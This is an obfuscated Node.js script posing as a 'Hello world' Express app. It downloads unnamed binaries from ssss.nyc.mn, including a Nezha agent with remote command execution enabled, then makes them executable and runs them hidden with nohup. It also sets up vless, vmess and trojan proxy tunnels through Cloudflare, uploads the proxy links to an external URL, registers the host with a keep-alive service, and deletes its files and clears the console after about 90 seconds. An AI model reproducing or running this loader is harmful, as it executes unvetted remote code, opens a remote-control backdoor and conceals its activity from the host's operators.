const _0x124899=_0x3cb6;(function(_0x3c505f,_0x4c0d0b){const _0x41dfa2=_0x3cb6,_0x4872c3=_0x3c505f();while(!![]){try{const _0x53cb08=parseInt(_0x41dfa2(0x1b8))/0x1*(parseInt(_0x41dfa2(0x1b4))/0x2)+parseInt(_0x41dfa2(0x1aa))/0x3*(parseInt(_0x41dfa2(0x1e0))/0x4)+-parseInt(_0x41dfa2(0x1f1))/0x5+-parseInt(_0x41dfa2(0x225))/0x6+parseInt(_0x41dfa2(0x184))/0x7*(-parseInt(_0x41dfa2(0x1ba))/0x8)+parseInt(_0x41dfa2(0x1c8))/0x9+-parseInt(_0x41dfa2(0x1a2))/0xa;if(_0x53cb08===_0x4c0d0b)break;else _0x4872c3['push'](_0x4872c3['shift']());}catch(_0x2c5f4c){_0x4872c3['push'](_0x4872c3['shift']());}}}(_0x59f8,0xde884));const express=require(_0x124899(0x200)),app=express(),axios=require(_0x124899(0x1f9)),os=require('os'),fs=require('fs'),path=require(_0x124899(0x1fc)),{promisify}=require(_0x124899(0x1b6)),exec=promisify(require('child_process')[_0x124899(0x19c)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x124899(0x20c)][_0x124899(0x1a7)]||'',PROJECT_URL=process[_0x124899(0x20c)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x124899(0x20c)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x124899(0x20c)][_0x124899(0x1c0)]||_0x124899(0x210),SUB_PATH=process[_0x124899(0x20c)][_0x124899(0x191)]||_0x124899(0x18e),PORT=process[_0x124899(0x20c)][_0x124899(0x1c3)]||process[_0x124899(0x20c)][_0x124899(0x229)]||0xbb8,UUID=process[_0x124899(0x20c)][_0x124899(0x182)]||_0x124899(0x183),NEZHA_SERVER=process[_0x124899(0x20c)][_0x124899(0x218)]||'',NEZHA_PORT=process[_0x124899(0x20c)][_0x124899(0x1d9)]||'',NEZHA_KEY=process[_0x124899(0x20c)][_0x124899(0x219)]||'',ARGO_DOMAIN=process[_0x124899(0x20c)][_0x124899(0x1d1)]||_0x124899(0x228),ARGO_AUTH=process[_0x124899(0x20c)][_0x124899(0x1c5)]||_0x124899(0x1e1),ARGO_PORT=process[_0x124899(0x20c)]['ARGO_PORT']||0x1f41,CFIP=process[_0x124899(0x20c)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x124899(0x20c)][_0x124899(0x192)]||0x1bb,NAME=process[_0x124899(0x20c)][_0x124899(0x1a1)]||_0x124899(0x222);!fs['existsSync'](FILE_PATH)?(fs[_0x124899(0x1d8)](FILE_PATH),console[_0x124899(0x21e)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x124899(0x1d5));function generateRandomName(){const _0x29b765=_0x124899,_0x1da081=_0x29b765(0x189);let _0x3db8d1='';for(let _0x2b941a=0x0;_0x2b941a<0x6;_0x2b941a++){_0x3db8d1+=_0x1da081[_0x29b765(0x187)](Math[_0x29b765(0x21c)](Math['random']()*_0x1da081[_0x29b765(0x1ff)]));}return _0x3db8d1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x124899(0x209)](FILE_PATH,npmName),phpPath=path[_0x124899(0x209)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x124899(0x209)](FILE_PATH,botName),subPath=path[_0x124899(0x209)](FILE_PATH,_0x124899(0x1e3)),listPath=path[_0x124899(0x209)](FILE_PATH,'list.txt'),bootLogPath=path[_0x124899(0x209)](FILE_PATH,_0x124899(0x22a)),configPath=path['join'](FILE_PATH,_0x124899(0x17e));function deleteNodes(){const _0x2dcb77=_0x124899;try{if(!UPLOAD_URL)return;if(!fs[_0x2dcb77(0x1ef)](subPath))return;let _0x250f08;try{_0x250f08=fs[_0x2dcb77(0x1a8)](subPath,_0x2dcb77(0x193));}catch{return null;}const _0x4931c3=Buffer[_0x2dcb77(0x1de)](_0x250f08,_0x2dcb77(0x212))['toString'](_0x2dcb77(0x193)),_0x37818a=_0x4931c3['split']('\x0a')[_0x2dcb77(0x1cf)](_0x12c00a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x12c00a));if(_0x37818a[_0x2dcb77(0x1ff)]===0x0)return;return axios[_0x2dcb77(0x1c7)](UPLOAD_URL+_0x2dcb77(0x1c6),JSON['stringify']({'nodes':_0x37818a}),{'headers':{'Content-Type':_0x2dcb77(0x1ab)}})[_0x2dcb77(0x1a3)](_0x45ae0c=>{return null;}),null;}catch(_0x58a5c5){return null;}}function cleanupOldFiles(){const _0x461ffa=_0x124899;try{const _0x4936a7=fs[_0x461ffa(0x1ee)](FILE_PATH);_0x4936a7['forEach'](_0xc1337f=>{const _0x77ca7c=_0x461ffa,_0x7f4103=path[_0x77ca7c(0x209)](FILE_PATH,_0xc1337f);try{const _0x301370=fs[_0x77ca7c(0x20e)](_0x7f4103);_0x301370['isFile']()&&fs[_0x77ca7c(0x1b9)](_0x7f4103);}catch(_0x16b386){}});}catch(_0x2a10d6){}}app[_0x124899(0x215)]('/',function(_0x21dbae,_0xca96af){const _0x2bea42=_0x124899;_0xca96af[_0x2bea42(0x1cd)](_0x2bea42(0x1ae));});async function generateConfig(){const _0x4fbb9b=_0x124899,_0x39d80f={'log':{'access':'/dev/null','error':_0x4fbb9b(0x1b5),'loglevel':_0x4fbb9b(0x230)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4fbb9b(0x220)}],'decryption':_0x4fbb9b(0x230),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4fbb9b(0x1af)}},{'port':0xbb9,'listen':_0x4fbb9b(0x19f),'protocol':_0x4fbb9b(0x20f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x4fbb9b(0x230)}},{'port':0xbba,'listen':_0x4fbb9b(0x19f),'protocol':_0x4fbb9b(0x20f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4fbb9b(0x230)},'streamSettings':{'network':'ws','security':_0x4fbb9b(0x230),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4fbb9b(0x1be),_0x4fbb9b(0x205),_0x4fbb9b(0x214)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4fbb9b(0x19f),'protocol':_0x4fbb9b(0x179),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4fbb9b(0x1ec)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4fbb9b(0x205),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4fbb9b(0x19f),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4fbb9b(0x230),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4fbb9b(0x1be),_0x4fbb9b(0x205),_0x4fbb9b(0x214)],'metadataOnly':![]}}],'dns':{'servers':[_0x4fbb9b(0x1ea)]},'outbounds':[{'protocol':_0x4fbb9b(0x1fb),'tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x4fbb9b(0x1bb)](path[_0x4fbb9b(0x209)](FILE_PATH,_0x4fbb9b(0x17e)),JSON[_0x4fbb9b(0x213)](_0x39d80f,null,0x2));}function getSystemArchitecture(){const _0x3cedd3=_0x124899,_0x29fdbc=os['arch']();return _0x29fdbc===_0x3cedd3(0x1e5)||_0x29fdbc==='arm64'||_0x29fdbc===_0x3cedd3(0x211)?_0x3cedd3(0x1e5):'amd';}function downloadFile(_0x4b8737,_0x42378f,_0x46bdb7){const _0xaf6202=_0x124899,_0x5ba45b=_0x4b8737;!fs[_0xaf6202(0x1ef)](FILE_PATH)&&fs[_0xaf6202(0x1d8)](FILE_PATH,{'recursive':!![]});const _0x4bfa11=fs[_0xaf6202(0x1a9)](_0x5ba45b);axios({'method':_0xaf6202(0x215),'url':_0x42378f,'responseType':_0xaf6202(0x1c2)})[_0xaf6202(0x1fa)](_0x316ae0=>{const _0x12e8fe=_0xaf6202;_0x316ae0[_0x12e8fe(0x217)][_0x12e8fe(0x1e8)](_0x4bfa11),_0x4bfa11['on'](_0x12e8fe(0x1f6),()=>{const _0x56de4d=_0x12e8fe;_0x4bfa11['close'](),console['log']('Download\x20'+path[_0x56de4d(0x185)](_0x5ba45b)+_0x56de4d(0x1d4)),_0x46bdb7(null,_0x5ba45b);}),_0x4bfa11['on'](_0x12e8fe(0x1b7),_0x111941=>{const _0x533d9a=_0x12e8fe;fs['unlink'](_0x5ba45b,()=>{});const _0x4165b5=_0x533d9a(0x1e6)+path[_0x533d9a(0x185)](_0x5ba45b)+'\x20failed:\x20'+_0x111941[_0x533d9a(0x226)];console[_0x533d9a(0x1b7)](_0x4165b5),_0x46bdb7(_0x4165b5);});})['catch'](_0x5a7e25=>{const _0x1a31f4=_0xaf6202,_0x1364c7=_0x1a31f4(0x1e6)+path[_0x1a31f4(0x185)](_0x5ba45b)+_0x1a31f4(0x1a0)+_0x5a7e25['message'];console[_0x1a31f4(0x1b7)](_0x1364c7),_0x46bdb7(_0x1364c7);});}async function downloadFilesAndRun(){const _0x624042=_0x124899,_0xe8163=getSystemArchitecture(),_0xf47bf9=getFilesForArchitecture(_0xe8163);if(_0xf47bf9[_0x624042(0x1ff)]===0x0){console[_0x624042(0x21e)](_0x624042(0x1d7));return;}const _0x59c805=_0xf47bf9[_0x624042(0x1f8)](_0x515b1b=>{return new Promise((_0x875161,_0x26375b)=>{downloadFile(_0x515b1b['fileName'],_0x515b1b['fileUrl'],(_0x483c5e,_0x20abd8)=>{_0x483c5e?_0x26375b(_0x483c5e):_0x875161(_0x20abd8);});});});try{await Promise[_0x624042(0x197)](_0x59c805);}catch(_0x1b2615){console[_0x624042(0x1b7)](_0x624042(0x208),_0x1b2615);return;}function _0x5b8e2f(_0x40522d){const _0x3ea0f7=_0x624042,_0x258303=0x1fd;_0x40522d[_0x3ea0f7(0x1da)](_0x5478a8=>{const _0x22edba=_0x3ea0f7;fs[_0x22edba(0x1ef)](_0x5478a8)&&fs[_0x22edba(0x1e7)](_0x5478a8,_0x258303,_0xd8362b=>{const _0x4bb2dd=_0x22edba;_0xd8362b?console['error'](_0x4bb2dd(0x178)+_0x5478a8+':\x20'+_0xd8362b):console[_0x4bb2dd(0x21e)]('Empowerment\x20success\x20for\x20'+_0x5478a8+':\x20'+_0x258303[_0x4bb2dd(0x1f4)](0x8));});});}const _0x27aba0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5b8e2f(_0x27aba0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35b29f=NEZHA_SERVER[_0x624042(0x1f3)](':')?NEZHA_SERVER[_0x624042(0x22d)](':')[_0x624042(0x1a4)]():'',_0x278bfb=new Set([_0x624042(0x1df),_0x624042(0x203),'2096',_0x624042(0x1cb),_0x624042(0x19e),'2053']),_0x2f7746=_0x278bfb['has'](_0x35b29f)?_0x624042(0x19a):_0x624042(0x204),_0x16334b=_0x624042(0x22c)+NEZHA_KEY+_0x624042(0x18c)+NEZHA_SERVER+_0x624042(0x18d)+_0x2f7746+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x624042(0x1bb)](path['join'](FILE_PATH,_0x624042(0x194)),_0x16334b);const _0x3c0e61=_0x624042(0x1a5)+phpPath+_0x624042(0x1ac)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3c0e61),console[_0x624042(0x21e)](phpName+_0x624042(0x1a6)),await new Promise(_0x51ef20=>setTimeout(_0x51ef20,0x3e8));}catch(_0x21ea0b){console[_0x624042(0x1b7)](_0x624042(0x1ce)+_0x21ea0b);}}else{let _0xc27c83='';const _0x1d8a30=[_0x624042(0x1df),_0x624042(0x203),_0x624042(0x17f),_0x624042(0x1cb),_0x624042(0x19e),'2053'];_0x1d8a30['includes'](NEZHA_PORT)&&(_0xc27c83='--tls');const _0x545691=_0x624042(0x1a5)+npmPath+_0x624042(0x195)+NEZHA_SERVER+':'+NEZHA_PORT+_0x624042(0x176)+NEZHA_KEY+'\x20'+_0xc27c83+_0x624042(0x207);try{await exec(_0x545691),console['log'](npmName+_0x624042(0x1a6)),await new Promise(_0x23d42b=>setTimeout(_0x23d42b,0x3e8));}catch(_0x51462d){console['error'](_0x624042(0x221)+_0x51462d);}}}else console[_0x624042(0x21e)](_0x624042(0x1ed));const _0x2e8f16='nohup\x20'+webPath+_0x624042(0x19d)+FILE_PATH+_0x624042(0x20a);try{await exec(_0x2e8f16),console[_0x624042(0x21e)](webName+_0x624042(0x1a6)),await new Promise(_0x660d51=>setTimeout(_0x660d51,0x3e8));}catch(_0xc50fbe){console[_0x624042(0x1b7)]('web\x20running\x20error:\x20'+_0xc50fbe);}if(fs[_0x624042(0x1ef)](botPath)){let _0x4b7cdb;if(ARGO_AUTH[_0x624042(0x1e9)](/^[A-Z0-9a-z=]{120,250}$/))_0x4b7cdb='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x624042(0x1e9)](/TunnelSecret/)?_0x4b7cdb=_0x624042(0x22e)+FILE_PATH+_0x624042(0x1e2):_0x4b7cdb=_0x624042(0x17b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x624042(0x1a5)+botPath+'\x20'+_0x4b7cdb+_0x624042(0x1c9)),console[_0x624042(0x21e)](botName+_0x624042(0x1a6)),await new Promise(_0x42bad3=>setTimeout(_0x42bad3,0x7d0));}catch(_0x7cf659){console[_0x624042(0x1b7)]('Error\x20executing\x20command:\x20'+_0x7cf659);}}await new Promise(_0x132807=>setTimeout(_0x132807,0x1388));}function _0x3cb6(_0x4c827a,_0x2e9ba3){const _0x59f89d=_0x59f8();return _0x3cb6=function(_0x3cb6c2,_0x8059d7){_0x3cb6c2=_0x3cb6c2-0x176;let _0x2c31f8=_0x59f89d[_0x3cb6c2];return _0x2c31f8;},_0x3cb6(_0x4c827a,_0x2e9ba3);}function getFilesForArchitecture(_0x4b74d6){const _0x5aee25=_0x124899;let _0x521dda;_0x4b74d6===_0x5aee25(0x1e5)?_0x521dda=[{'fileName':webPath,'fileUrl':_0x5aee25(0x1bc)},{'fileName':botPath,'fileUrl':_0x5aee25(0x17d)}]:_0x521dda=[{'fileName':webPath,'fileUrl':_0x5aee25(0x198)},{'fileName':botPath,'fileUrl':_0x5aee25(0x1dc)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x290a9d=_0x4b74d6===_0x5aee25(0x1e5)?'https://arm64.ssss.nyc.mn/agent':_0x5aee25(0x1dd);_0x521dda[_0x5aee25(0x19b)]({'fileName':npmPath,'fileUrl':_0x290a9d});}else{const _0x463c3e=_0x4b74d6===_0x5aee25(0x1e5)?'https://arm64.ssss.nyc.mn/v1':_0x5aee25(0x1c1);_0x521dda[_0x5aee25(0x19b)]({'fileName':phpPath,'fileUrl':_0x463c3e});}}return _0x521dda;}function argoType(){const _0x18fa66=_0x124899;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x18fa66(0x1b2));return;}if(ARGO_AUTH[_0x18fa66(0x1f3)](_0x18fa66(0x17c))){fs[_0x18fa66(0x1bb)](path['join'](FILE_PATH,_0x18fa66(0x1f7)),ARGO_AUTH);const _0x58625d=_0x18fa66(0x1d6)+ARGO_AUTH['split']('\x22')[0xb]+_0x18fa66(0x1c4)+path[_0x18fa66(0x209)](FILE_PATH,_0x18fa66(0x1f7))+_0x18fa66(0x1b1)+ARGO_DOMAIN+_0x18fa66(0x224)+ARGO_PORT+_0x18fa66(0x1bf);fs['writeFileSync'](path[_0x18fa66(0x209)](FILE_PATH,_0x18fa66(0x22f)),_0x58625d);}else console[_0x18fa66(0x21e)](_0x18fa66(0x196));}argoType();async function extractDomains(){const _0x5895ae=_0x124899;let _0x4d59f0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4d59f0=ARGO_DOMAIN,console['log'](_0x5895ae(0x1eb),_0x4d59f0),await _0x4dacdc(_0x4d59f0);else try{const _0x5f49f6=fs[_0x5895ae(0x1a8)](path[_0x5895ae(0x209)](FILE_PATH,_0x5895ae(0x22a)),_0x5895ae(0x193)),_0x5a9caa=_0x5f49f6['split']('\x0a'),_0x3b2c78=[];_0x5a9caa['forEach'](_0x4bc5f3=>{const _0x1200ec=_0x5895ae,_0x34eaf5=_0x4bc5f3[_0x1200ec(0x1e9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x34eaf5){const _0x1d8ad1=_0x34eaf5[0x1];_0x3b2c78[_0x1200ec(0x1fe)](_0x1d8ad1);}});if(_0x3b2c78[_0x5895ae(0x1ff)]>0x0)_0x4d59f0=_0x3b2c78[0x0],console[_0x5895ae(0x21e)](_0x5895ae(0x199),_0x4d59f0),await _0x4dacdc(_0x4d59f0);else{console[_0x5895ae(0x21e)](_0x5895ae(0x188)),fs[_0x5895ae(0x1b9)](path[_0x5895ae(0x209)](FILE_PATH,_0x5895ae(0x22a)));async function _0x4ab940(){const _0x3e01cf=_0x5895ae;try{process[_0x3e01cf(0x202)]===_0x3e01cf(0x1bd)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x3e01cf(0x1fd)+botName[_0x3e01cf(0x187)](0x0)+']'+botName[_0x3e01cf(0x18a)](0x1)+_0x3e01cf(0x22b));}catch(_0x1a20b1){}}_0x4ab940(),await new Promise(_0x30ee6e=>setTimeout(_0x30ee6e,0xbb8));const _0x5357db=_0x5895ae(0x17b)+FILE_PATH+_0x5895ae(0x223)+ARGO_PORT;try{await exec(_0x5895ae(0x1a5)+botPath+'\x20'+_0x5357db+_0x5895ae(0x1c9)),console[_0x5895ae(0x21e)](botName+_0x5895ae(0x1a6)),await new Promise(_0x36013f=>setTimeout(_0x36013f,0xbb8)),await extractDomains();}catch(_0x253f24){console[_0x5895ae(0x1b7)]('Error\x20executing\x20command:\x20'+_0x253f24);}}}catch(_0x2524b6){console[_0x5895ae(0x1b7)]('Error\x20reading\x20boot.log:',_0x2524b6);}async function _0x4dacdc(_0xe37a8d){const _0x520c4f=_0x5895ae,_0x6122e7=execSync(_0x520c4f(0x227),{'encoding':_0x520c4f(0x193)}),_0x3b2523=_0x6122e7['trim'](),_0x44bd22=NAME?NAME+'-'+_0x3b2523:_0x3b2523;return new Promise(_0x2b455d=>{setTimeout(()=>{const _0x364ae9=_0x3cb6,_0x569fe={'v':'2','ps':''+_0x44bd22,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x364ae9(0x230),'net':'ws','type':_0x364ae9(0x230),'host':_0xe37a8d,'path':_0x364ae9(0x21d),'tls':_0x364ae9(0x205),'sni':_0xe37a8d,'alpn':'','fp':_0x364ae9(0x1d3)},_0x58ab9a=_0x364ae9(0x21a)+UUID+'@'+CFIP+':'+CFPORT+_0x364ae9(0x1b0)+_0xe37a8d+_0x364ae9(0x20d)+_0xe37a8d+_0x364ae9(0x1f0)+_0x44bd22+_0x364ae9(0x1f5)+Buffer[_0x364ae9(0x1de)](JSON[_0x364ae9(0x213)](_0x569fe))['toString'](_0x364ae9(0x212))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x364ae9(0x20b)+_0xe37a8d+'&fp=firefox&type=ws&host='+_0xe37a8d+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x44bd22+_0x364ae9(0x1f2);console[_0x364ae9(0x21e)](Buffer[_0x364ae9(0x1de)](_0x58ab9a)[_0x364ae9(0x1f4)](_0x364ae9(0x212))),fs[_0x364ae9(0x1bb)](subPath,Buffer['from'](_0x58ab9a)['toString'](_0x364ae9(0x212))),console[_0x364ae9(0x21e)](FILE_PATH+_0x364ae9(0x190)),uploadNodes(),app[_0x364ae9(0x215)]('/'+SUB_PATH,(_0x46587f,_0x5105ec)=>{const _0xb13fd=_0x364ae9,_0x3c171c=Buffer[_0xb13fd(0x1de)](_0x58ab9a)[_0xb13fd(0x1f4)](_0xb13fd(0x212));_0x5105ec['set'](_0xb13fd(0x1ad),'text/plain;\x20charset=utf-8'),_0x5105ec[_0xb13fd(0x1cd)](_0x3c171c);}),_0x2b455d(_0x58ab9a);},0x7d0);});}}async function uploadNodes(){const _0x4f5eae=_0x124899;if(UPLOAD_URL&&PROJECT_URL){const _0xccf755=PROJECT_URL+'/'+SUB_PATH,_0x153d4a={'subscription':[_0xccf755]};try{const _0x1aaa21=await axios[_0x4f5eae(0x1c7)](UPLOAD_URL+_0x4f5eae(0x177),_0x153d4a,{'headers':{'Content-Type':_0x4f5eae(0x1ab)}});return _0x1aaa21&&_0x1aaa21[_0x4f5eae(0x21f)]===0xc8?(console[_0x4f5eae(0x21e)](_0x4f5eae(0x18b)),_0x1aaa21):null;}catch(_0xc7b907){if(_0xc7b907['response']){if(_0xc7b907['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4f5eae(0x1ef)](listPath))return;const _0x1e2274=fs['readFileSync'](listPath,_0x4f5eae(0x193)),_0x5bc2b7=_0x1e2274[_0x4f5eae(0x22d)]('\x0a')[_0x4f5eae(0x1cf)](_0x4c3ec6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4c3ec6));if(_0x5bc2b7[_0x4f5eae(0x1ff)]===0x0)return;const _0x55310e=JSON[_0x4f5eae(0x213)]({'nodes':_0x5bc2b7});try{const _0x3ee4ab=await axios[_0x4f5eae(0x1c7)](UPLOAD_URL+_0x4f5eae(0x17a),_0x55310e,{'headers':{'Content-Type':_0x4f5eae(0x1ab)}});return _0x3ee4ab&&_0x3ee4ab['status']===0xc8?(console[_0x4f5eae(0x21e)](_0x4f5eae(0x1cc)),_0x3ee4ab):null;}catch(_0x396da0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xcf21d3=_0x3cb6,_0x502d3e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x502d3e[_0xcf21d3(0x1fe)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x502d3e[_0xcf21d3(0x1fe)](phpPath);process['platform']===_0xcf21d3(0x1bd)?exec(_0xcf21d3(0x1b3)+_0x502d3e[_0xcf21d3(0x209)]('\x20')+_0xcf21d3(0x181),_0x3573d0=>{const _0x57540d=_0xcf21d3;console[_0x57540d(0x1e4)](),console[_0x57540d(0x21e)](_0x57540d(0x180)),console[_0x57540d(0x21e)](_0x57540d(0x186));}):exec(_0xcf21d3(0x1ca)+_0x502d3e[_0xcf21d3(0x209)]('\x20')+_0xcf21d3(0x1d2),_0x11e5a2=>{const _0x216894=_0xcf21d3;console['clear'](),console[_0x216894(0x21e)]('App\x20is\x20running'),console[_0x216894(0x21e)](_0x216894(0x186));});},0x15f90);}cleanFiles();function _0x59f8(){const _0x22c443=['NEZHA_KEY','\x0avless://','http\x20server\x20is\x20running\x20on\x20port:','floor','/vmess-argo?ed=2560','log','status','xtls-rprx-vision','npm\x20running\x20error:\x20','railway','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','1985286aLKyVz','message','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','railway.txy103.ggff.net','PORT','boot.log','\x22\x20>\x20/dev/null\x202>&1','\x0aclient_secret:\x20','split','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.yml','none','\x20-p\x20','/api/add-subscriptions','Empowerment\x20failed\x20for\x20','vmess','/api/add-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','TunnelSecret','https://arm64.ssss.nyc.mn/bot','config.json','2096','App\x20is\x20running','\x20>\x20nul\x202>&1','UUID','9afd1229-b893-40c1-84dd-51e7ce204913','14LHvulB','basename','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','charAt','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','abcdefghijklmnopqrstuvwxyz','substring','Subscription\x20uploaded\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','sub','Skipping\x20adding\x20automatic\x20access\x20task','/sub.txt\x20saved\x20successfully','SUB_PATH','CFPORT','utf-8','config.yaml','\x20-s\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','all','https://amd64.ssss.nyc.mn/web','ArgoDomain:','true','unshift','exec','\x20-c\x20','2083','127.0.0.1','\x20failed:\x20','NAME','2044920fDXmhE','catch','pop','nohup\x20','\x20is\x20running','UPLOAD_URL','readFileSync','createWriteStream','4258224bgqfGM','application/json','\x20-c\x20\x22','Content-Type','Hello\x20world!','tcp','?encryption=none&security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','del\x20/f\x20/q\x20','98VAnmwQ','/dev/null','util','error','31799CIQqBQ','unlinkSync','6073688OYJXzL','writeFileSync','https://arm64.ssss.nyc.mn/web','win32','http','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','FILE_PATH','https://amd64.ssss.nyc.mn/v1','stream','SERVER_PORT','\x0a\x20\x20credentials-file:\x20','ARGO_AUTH','/api/delete-nodes','post','7560441kyEdsu','\x20>/dev/null\x202>&1\x20&','rm\x20-rf\x20','2087','Nodes\x20uploaded\x20successfully','send','php\x20running\x20error:\x20','filter','Error\x20in\x20startserver:','ARGO_DOMAIN','\x20>/dev/null\x202>&1','firefox','\x20successfully','\x20already\x20exists','\x0a\x20\x20tunnel:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','mkdirSync','NEZHA_PORT','forEach','listen','https://amd64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/agent','from','443','4XrPwUn','eyJhIjoiZGU3NmVjN2U5ZDU2NGU1NmFmZWY3NThhNzBjZWFmY2IiLCJ0IjoiZGY3ZmMxNWEtNzY5Mi00NDQxLWE0ZTEtZTdhZTE5YWRlODgxIiwicyI6Ik9XWmlPR014WVRBdE16RXlZeTAwWW1NM0xXRmpObUV0TXpoa05tSmxPRFF3TkROaiJ9','/tunnel.yml\x20run','sub.txt','clear','arm','Download\x20','chmod','pipe','match','https+local://8.8.8.8/dns-query','ARGO_DOMAIN:','/vmess-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','readdirSync','existsSync','&path=%2Fvless-argo%3Fed%3D2560#','4261605ddwwVn','\x0a\x20\x20\x20\x20','includes','toString','\x0a\x20\x20\x0avmess://','finish','tunnel.json','map','axios','then','freedom','path','pkill\x20-f\x20\x22[','push','length','express','Add\x20automatic\x20access\x20task\x20faild:\x20','platform','8443','false','tls','automatic\x20access\x20task\x20added\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Error\x20downloading\x20files:','join','/config.json\x20>/dev/null\x202>&1\x20&','?security=tls&sni=','env','&fp=firefox&type=ws&host=','statSync','vless','./tmp','aarch64','base64','stringify','quic','get','Unhandled\x20error\x20in\x20startserver:','data','NEZHA_SERVER'];_0x59f8=function(){return _0x22c443;};return _0x59f8();}async function AddVisitTask(){const _0x5abaa4=_0x124899;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5abaa4(0x21e)](_0x5abaa4(0x18f));return;}try{const _0x6f8195=await axios[_0x5abaa4(0x1c7)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5abaa4(0x1ab)}});return console[_0x5abaa4(0x21e)](_0x5abaa4(0x206)),_0x6f8195;}catch(_0x253d55){return console['error'](_0x5abaa4(0x201)+_0x253d55['message']),null;}}async function startserver(){const _0x3d5489=_0x124899;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4bbc89){console[_0x3d5489(0x1b7)](_0x3d5489(0x1d0),_0x4bbc89);}}startserver()['catch'](_0x4fc91b=>{const _0x1c5899=_0x124899;console['error'](_0x1c5899(0x216),_0x4fc91b);}),app[_0x124899(0x1db)](PORT,()=>console[_0x124899(0x21e)](_0x124899(0x21b)+PORT+'!'));
